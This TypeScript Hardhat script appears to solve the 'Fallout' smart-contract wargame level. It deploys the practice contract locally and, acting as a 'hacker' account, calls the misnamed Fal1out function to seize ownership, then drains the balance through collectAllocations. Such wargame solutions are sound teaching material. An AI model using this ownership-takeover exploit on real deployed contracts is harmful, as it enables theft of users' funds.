import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/02-fallout';

const INSTANCE_CONTRACT_NAME = 'Fallout';

const getContractOwnerName = (newOwner: string, hacker: string) => {
  return newOwner === hacker ? 'hacker' : 'deployer';
};

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(INSTANCE_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(hacker);

  const initialOwnerAddress = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(initialOwnerAddress, hackerAddress));

  const initialContractBalance = await ethers.provider.getBalance(contractAddress);
  console.log('Initial contract balance:', initialContractBalance);

  const initialHackerBalance = await ethers.provider.getBalance(hackerAddress);
  console.log('Initial hacker balance:', initialHackerBalance);

  console.log('1. Call Fal1out with sending 1 wei in order to become the owner...');

  await contract.Fal1out({ value: ethers.parseUnits('1', 'wei') });

  const newOwner = await contract.owner();
  console.log('The owner of the contract is', getContractOwnerName(newOwner, hackerAddress));

  console.log('2. Withdrawing money from the contract by calling the collectAllocations function...');
  await contract.collectAllocations();

  const newContractBalance = await ethers.provider.getBalance(contractAddress);
  const newHackerBalance = await ethers.provider.getBalance(hackerAddress);

  console.log('New contract balance:', newContractBalance);
  console.log('New hacker balance:', newHackerBalance);

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
